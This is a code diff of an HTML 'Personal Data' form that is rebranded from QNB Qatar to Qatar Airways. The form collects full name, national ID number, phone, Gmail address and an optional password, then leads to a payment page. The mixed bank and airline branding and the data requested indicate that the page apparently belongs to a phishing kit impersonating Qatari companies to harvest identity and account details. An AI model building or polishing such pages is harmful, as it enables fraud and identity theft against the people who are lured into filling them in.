@@ -3,15 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QNB Qatar - Personal Information</title>
+    <title>Qatar Airways - Personal Data</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --qatar-maroon: #5C0632;
+            --qatar-gold: #D4AF37;
+            --bg-light: #F5F8FF;
+            --text-dark: #1A2744;
+        }
         *, *::before, *::after { box-sizing: border-box; }
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
-            background-color: #F5F8FF;
-            color: #212529;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
         }
         header {
             position: fixed;
@@ -19,305 +27,206 @@
             left: 0;
             width: 100%;
             background-color: #ffffff;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 40px;
+            padding: 12px 24px;
             z-index: 1000;
         }
         .header-left {
             display: flex;
             align-items: center;
-            gap: 20px;
-        }
-        .header-left img {
-            height: 42px;
-            object-fit: contain;
-        }
-        .lang-btn {
-            font-weight: bold;
-            color: #ffffff;
-            background: #5C0632;
-            padding: 10px 20px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-size: 15px;
-        }
-        .lang-btn:hover {
-            background-color: #3D0420;
-        }
-        .header-right {
-            display: flex;
-            align-items: center;
             gap: 15px;
-            color: #000000;
-            font-weight: 600;
-            font-size: 15px;
-        }
-        .phone-group {
-            display: none;
-            align-items: center;
-            gap: 8px;
         }
         .menu-icon {
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            width: 22px;
-            height: 16px;
+            width: 24px;
+            height: 18px;
             cursor: pointer;
         }
         .menu-icon span {
             display: block;
-            height: 3px;
-            background-color: #000000;
+            height: 2px;
+            background-color: #000;
             border-radius: 2px;
         }
+        .header-left img {
+            height: 38px;
+            object-fit: contain;
+            display: block;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #ffffff;
+            background: var(--qatar-maroon);
+            padding: 8px 18px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 14px;
+        }
         
-        /* Full Width Professional Form Container */
         .main-container {
             margin-top: 85px;
             width: 100%;
-            min-height: calc(100vh - 85px);
-            background-color: #F5F8FF;
-            padding: 50px 20px 80px 20px;
+            padding: 40px 15px;
             display: flex;
             justify-content: center;
-            align-items: center;
         }
         .form-wrapper {
             width: 100%;
-            max-width: 900px;
+            max-width: 600px;
             background: #ffffff;
-            padding: 50px 60px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
-            border: 1px solid #D6E4F0;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
         }
         .form-title {
-            font-size: 28px;
-            color: #5C0632;
-            margin-bottom: 35px;
-            font-weight: 700;
+            font-size: 22px;
+            color: var(--qatar-maroon);
+            margin-bottom: 25px;
+            font-weight: 800;
             text-align: center;
-            border-bottom: 2px solid #E0EBF7;
-            padding-bottom: 15px;
         }
         
-        /* Grid layout for inputs */
-        .form-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 25px;
-        }
         .form-group {
-            margin-bottom: 22px;
-        }
-        .form-group.full-width {
-            grid-column: span 2;
+            margin-bottom: 20px;
         }
         .form-group label {
             display: block;
-            font-weight: 600;
+            font-weight: 700;
             margin-bottom: 8px;
-            color: #1A2744;
             font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
         .form-control {
             width: 100%;
-            padding: 14px 18px;
-            border: 1.5px solid #B8D4E8;
-            border-radius: 8px;
+            padding: 12px 15px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
             font-size: 15px;
             outline: none;
-            transition: all 0.3s ease;
-            background-color: #fafbfc;
-            color: #333;
+            transition: border-color 0.3s;
         }
         .form-control:focus {
-            border-color: #5C0632;
-            background-color: #fff;
-            box-shadow: 0 0 0 4px rgba(0,51,160,0.12);
+            border-color: var(--qatar-maroon);
+        }
+
+        /* Phone Input with Country Selector */
+        .phone-input-group {
+            display: flex;
+            gap: 10px;
+        }
+        .country-code-select {
+            flex: 0 0 130px;
+            background-color: #f8f9fa;
         }
         
-        /* Phone input with country flag */
-        .phone-input-wrapper {
+        .radio-list {
             display: flex;
-            align-items: center;
-            border: 1.5px solid #B8D4E8;
-            border-radius: 8px;
-            overflow: hidden;
-            background-color: #fafbfc;
-            transition: all 0.3s ease;
+            flex-direction: column;
+            gap: 15px;
+            margin: 10px 0;
         }
-        .phone-input-wrapper:focus-within {
-            border-color: #5C0632;
-            background-color: #fff;
-            box-shadow: 0 0 0 4px rgba(0,51,160,0.12);
-        }
-        .phone-country-code {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 14px 12px;
-            background-color: #F0F5FF;
-            border-right: 1.5px solid #B8D4E8;
-            font-size: 14px;
-            font-weight: 600;
-            color: #5C0632;
-            white-space: nowrap;
-            user-select: none;
-        }
-        .phone-country-flag {
-            font-size: 18px;
-            line-height: 1;
-        }
-        .phone-input-wrapper .form-control {
-            border: none;
-            border-radius: 0;
-            background: transparent;
-            box-shadow: none;
-            padding: 14px 18px;
-            flex: 1;
-        }
-        .phone-input-wrapper .form-control:focus {
-            box-shadow: none;
-        }
-
-        /* Dropdowns layout for dates */
-        .date-select-group {
-            display: flex;
-            gap: 12px;
-        }
-        .date-select-group select {
-            flex: 1;
-            background-color: #fafbfc;
-            cursor: pointer;
-        }
-
-        .radio-group {
-            display: flex;
-            gap: 30px;
-            margin-top: 10px;
-        }
-        .radio-label {
+        .radio-option {
             display: flex;
             align-items: center;
             gap: 10px;
-            font-weight: 500;
             cursor: pointer;
-            font-size: 16px;
-            color: #333;
+            font-weight: 600;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
         }
-        .radio-label input {
+        .radio-option input {
             width: 18px;
             height: 18px;
-            accent-color: #5C0632;
-        }
-        
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 30px 0;
-            cursor: pointer;
-            font-size: 15px;
-            color: #1A2744;
-            grid-column: span 2;
-        }
-        .checkbox-container input {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            accent-color: #5C0632;
-        }
-        
-        .submit-btn {
-            grid-column: span 2;
-            background-color: #5C0632;
-            color: #ffffff;
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0,51,160,0.2);
-            margin-top: 10px;
-        }
-        .submit-btn:hover {
-            background-color: #3D0420;
-            transform: translateY(-1px);
-            box-shadow: 0 6px 15px rgba(0,51,160,0.3);
+            accent-color: var(--qatar-maroon);
         }
 
-        /* Footer Section */
+        #createAccountFields {
+            display: none;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 15px;
+            padding: 15px;
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .checkbox-group input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--qatar-maroon);
+        }
+
+        .submit-btn {
+            background: var(--qatar-maroon);
+            color: #fff;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        .submit-btn:hover {
+            background: #4a0528;
+        }
+
         footer {
             background-color: #000000;
             color: #ffffff;
-            padding: 60px 20px 30px 20px;
+            padding: 40px 20px;
+            margin-top: 40px;
         }
         .footer-container {
             max-width: 1100px;
             margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .footer-logo {
-            height: 40px;
-            object-fit: contain;
-            margin-bottom: 25px;
-            filter: none;
-        }
-        .footer-info {
-            font-size: 15px;
-            line-height: 2.2;
-            color: #cccccc;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-        .footer-bottom {
-            margin-top: 40px;
-            width: 100%;
-            border-top: 1px solid #3D0420;
-            padding-top: 20px;
-            font-size: 14px;
-            color: #777777;
             text-align: center;
         }
-
-        /* Responsive */
-        @media(max-width: 768px) {
-            .form-grid {
-                grid-template-columns: 1fr;
-            }
-            .form-group.full-width, .checkbox-container, .submit-btn {
-                grid-column: span 1;
-            }
-            .form-wrapper {
-                padding: 30px 20px;
-            }
+        .footer-logo {
+            height: 35px;
+            margin-bottom: 20px;
+            filter: brightness(0) invert(1);
+        }
+        .footer-info {
+            font-size: 13px;
+            line-height: 1.8;
+            color: #ccc;
+        }
+        .footer-bottom {
+            margin-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
         }
     </style>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
 
-        <header>
-        <div class="menu-icon">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
+    <header>
         <div class="header-left">
-            <img src="images/qatar_airways/logo.png" alt="QNB Qatar">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <img src="images/qatar_airways/logo.png" alt="Qatar Airways">
         </div>
         <div class="header-right">
             <a href="data.html" class="lang-btn">العربية</a>
@@ -326,182 +235,167 @@
 
     <div class="main-container">
         <div class="form-wrapper">
-            <h2 class="form-title">Personal Information</h2>
-            <form id="personalDataForm" class="form-grid">
+            <h2 class="form-title">Personal Data</h2>
+            <form id="personalDataForm">
                 
+                <!-- Country of Residence -->
+                <div class="form-group">
+                    <label>Country of Residence</label>
+                    <select id="residence_country" name="residence_country" class="form-control" required>
+                        <option value="QA" selected>Qatar</option>
+                        <option value="SA">Saudi Arabia</option>
+                        <option value="AE">United Arab Emirates</option>
+                        <option value="KW">Kuwait</option>
+                        <option value="OM">Oman</option>
+                        <option value="BH">Bahrain</option>
+                        <option value="EG">Egypt</option>
+                        <option value="JO">Jordan</option>
+                        <option value="LB">Lebanon</option>
+                        <option value="SY">Syria</option>
+                        <option value="IQ">Iraq</option>
+                        <option value="PS">Palestine</option>
+                        <option value="DZ">Algeria</option>
+                        <option value="MA">Morocco</option>
+                        <option value="TN">Tunisia</option>
+                        <option value="LY">Libya</option>
+                        <option value="SD">Sudan</option>
+                        <option value="YE">Yemen</option>
+                        <option value="US">United States</option>
+                        <option value="GB">United Kingdom</option>
+                        <option value="FR">France</option>
+                        <option value="DE">Germany</option>
+                        <option value="TR">Turkey</option>
+                    </select>
+                </div>
+
                 <!-- Full Name -->
-                <div class="form-group full-width">
-                    <label for="fullname">Full Name</label>
-                    <input type="text" id="fullname" name="fullname" class="form-control" required placeholder="Enter your full name">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" name="fullname" class="form-control" required placeholder="Enter full name">
                 </div>
 
                 <!-- ID Number -->
                 <div class="form-group">
-                    <label for="id_number">ID Number</label>
-                    <input type="text" id="id_number" name="id_number" class="form-control" required placeholder="Enter ID number">
+                    <label>ID Number</label>
+                    <input type="text" name="id_number" class="form-control" required placeholder="Enter ID number">
                 </div>
 
-                <!-- Phone Number -->
+                <!-- Phone Number with Country Code -->
                 <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <div class="phone-input-wrapper">
-                        <div class="phone-country-code">
-                            <span class="phone-country-flag">🇶🇦</span>
-                            <span>+974</span>
-                        </div>
-                        <input type="tel" id="phone" name="phone" class="form-control" required placeholder="4440 XXXX">
+                    <label>Phone Number</label>
+                    <div class="phone-input-group">
+                        <select name="country_code" class="form-control country-code-select" required>
+                            <option value="+974" selected>🇶🇦 +974</option>
+                            <option value="+966">🇸🇦 +966</option>
+                            <option value="+971">🇦🇪 +971</option>
+                            <option value="+965">🇰🇼 +965</option>
+                            <option value="+968">🇴🇲 +968</option>
+                            <option value="+973">🇧🇭 +973</option>
+                            <option value="+20">🇪🇬 +20</option>
+                            <option value="+962">🇯🇴 +962</option>
+                            <option value="+961">🇱🇧 +961</option>
+                            <option value="+963">🇸🇾 +963</option>
+                            <option value="+964">🇮🇶 +964</option>
+                            <option value="+970">🇵🇸 +970</option>
+                            <option value="+213">🇩🇿 +213</option>
+                            <option value="+212">🇲🇦 +212</option>
+                            <option value="+216">🇹🇳 +216</option>
+                            <option value="+218">🇱🇾 +218</option>
+                            <option value="+249">🇸🇩 +249</option>
+                            <option value="+967">🇾🇪 +967</option>
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+90">🇹🇷 +90</option>
+                        </select>
+                        <input type="tel" name="main_phone" class="form-control" required placeholder="Phone number">
                     </div>
                 </div>
 
-                <!-- ID Expiry Date (Dropdowns) -->
+                <!-- Email -->
                 <div class="form-group">
-                    <label>ID Expiry Date</label>
-                    <div class="date-select-group">
-                        <select name="id_expiry_day" class="form-control" required>
-                            <option value="">Day</option>
-                            <script>
-                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
-                            </script>
-                        </select>
-                        <select name="id_expiry_month" class="form-control" required>
-                            <option value="">Month</option>
-                            <option value="1">January</option>
-                            <option value="2">February</option>
-                            <option value="3">March</option>
-                            <option value="4">April</option>
-                            <option value="5">May</option>
-                            <option value="6">June</option>
-                            <option value="7">July</option>
-                            <option value="8">August</option>
-                            <option value="9">September</option>
-                            <option value="10">October</option>
-                            <option value="11">November</option>
-                            <option value="12">December</option>
-                        </select>
-                        <select name="id_expiry_year" class="form-control" required>
-                            <option value="">Year</option>
-                            <script>
-                                for(let i=2026; i<=2050; i++) document.write(`<option value="${i}">${i}</option>`);
-                            </script>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Date of Birth (Dropdowns) -->
-                <div class="form-group">
-                    <label>Date of Birth</label>
-                    <div class="date-select-group">
-                        <select name="dob_day" class="form-control" required>
-                            <option value="">Day</option>
-                            <script>
-                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
-                            </script>
-                        </select>
-                        <select name="dob_month" class="form-control" required>
-                            <option value="">Month</option>
-                            <option value="1">January</option>
-                            <option value="2">February</option>
-                            <option value="3">March</option>
-                            <option value="4">April</option>
-                            <option value="5">May</option>
-                            <option value="6">June</option>
-                            <option value="7">July</option>
-                            <option value="8">August</option>
-                            <option value="9">September</option>
-                            <option value="10">October</option>
-                            <option value="11">November</option>
-                            <option value="12">December</option>
-                        </select>
-                        <select name="dob_year" class="form-control" required>
-                            <option value="">Year</option>
-                            <script>
-                                for(let i=1950; i<=2010; i++) document.write(`<option value="${i}">${i}</option>`);
-                            </script>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Gmail -->
-                <div class="form-group full-width">
-                    <label for="email">Gmail (Email Address)</label>
-                    <input type="email" id="email" name="email" class="form-control" required placeholder="example@gmail.com">
+                    <label>Email (Gmail)</label>
+                    <input type="email" name="email" class="form-control" required placeholder="example@gmail.com">
                 </div>
 
                 <!-- Gender -->
-                <div class="form-group full-width">
+                <div class="form-group">
                     <label>Gender</label>
-                    <div class="radio-group">
-                        <label class="radio-label">
-                            <input type="radio" name="gender" value="Male" required> Male
+                    <div class="radio-list">
+                        <label class="radio-option">
+                            <input type="radio" name="gender" value="male" checked> Male
                         </label>
-                        <label class="radio-label">
-                            <input type="radio" name="gender" value="Female" required> Female
+                        <label class="radio-option">
+                            <input type="radio" name="gender" value="female"> Female
                         </label>
                     </div>
                 </div>
 
-                <!-- Terms Checkbox -->
-                <label class="checkbox-container">
+                <!-- Account Type Selection -->
+                <div class="form-group">
+                    <label>Account Options</label>
+                    <div class="radio-list">
+                        <label class="radio-option">
+                            <input type="radio" name="account_type" value="login" checked onclick="toggleAccountFields(false)"> I have an account
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="account_type" value="create" onclick="toggleAccountFields(true)"> Create an account
+                        </label>
+                    </div>
+                    
+                    <!-- Extra Fields for Create Account -->
+                    <div id="createAccountFields">
+                        <div class="form-group">
+                            <label>Confirm Phone Number</label>
+                            <input type="tel" name="confirm_phone" class="form-control" placeholder="Confirm phone number">
+                        </div>
+                        <div class="form-group">
+                            <label>Confirm Email (Gmail)</label>
+                            <input type="email" name="confirm_email" class="form-control" placeholder="example@gmail.com">
+                        </div>
+                        <div class="form-group">
+                            <label>Create Password</label>
+                            <input type="password" name="password" class="form-control" placeholder="Password">
+                        </div>
+                        <div class="form-group">
+                            <label>Confirm Password</label>
+                            <input type="password" name="confirm_password" class="form-control" placeholder="Confirm password">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Terms -->
+                <div class="checkbox-group">
                     <input type="checkbox" required>
-                    <span>I accept the terms and conditions</span>
-                </label>
+                    <span>I agree to the Terms & Conditions and Privacy Policy.</span>
+                </div>
 
-                <!-- Submit Button -->
-                <button type="submit" class="submit-btn">Continue Order</button>
-
+                <button type="submit" class="submit-btn">Continue</button>
             </form>
         </div>
     </div>
 
-            <footer style="background-color: #5C0632; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
+    <footer>
         <div class="footer-container">
-            <a href="index-en.html"><img src="images/qatar_airways/logo.png" alt="QNB Qatar" class="footer-logo"></a>
+            <img src="images/qatar_airways/logo.png" alt="Qatar Airways" class="footer-logo">
             <div class="footer-info">
-                <strong>Qatar Airways</strong>
-                <span>Doha - State of Qatar</span>
-                <span>Phone: +974 4403 6666</span>
-                <span>Email: info@qatarairways.com</span>
+                © 2026 Qatar Airways. All rights reserved.<br>
+                We are committed to providing the best services and exclusive benefits to Privilege Club members.
             </div>
             <div class="footer-bottom">
-                <p>&copy; 2024 Qatar National Bank. All rights reserved.</p>
+                Privacy Policy | Terms & Conditions | Contact Us
             </div>
         </div>
     </footer>
 
+    <script>
+        function toggleAccountFields(show) {
+            const fields = document.getElementById('createAccountFields');
+            fields.style.display = show ? 'flex' : 'none';
+            const inputs = fields.querySelectorAll('input');
+            inputs.forEach(input => input.required = show);
+        }
+    </script>
 </body>
 </html>
-
-    <script>
-        document.getElementById('personalDataForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const formData = new FormData(e.target);
-            const data = Object.fromEntries(formData);
-            // Add country code to phone
-            if (data.phone && !data.phone.startsWith('+974')) {
-                data.phone = '+974 ' + data.phone;
-            }
-
-            try {
-                const response = await fetch('/api/orders/personal-data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                const result = await response.json();
-                
-                if (response.ok) {
-                    sessionStorage.setItem('orderId', result.orderId);
-                    window.location.href = 'payment-en.html';
-                } else {
-                    alert('Error: ' + result.error);
-                }
-            } catch (err) {
-                console.error('Error:', err);
-                alert('Connection error');
-            }
-        });
-    </script>
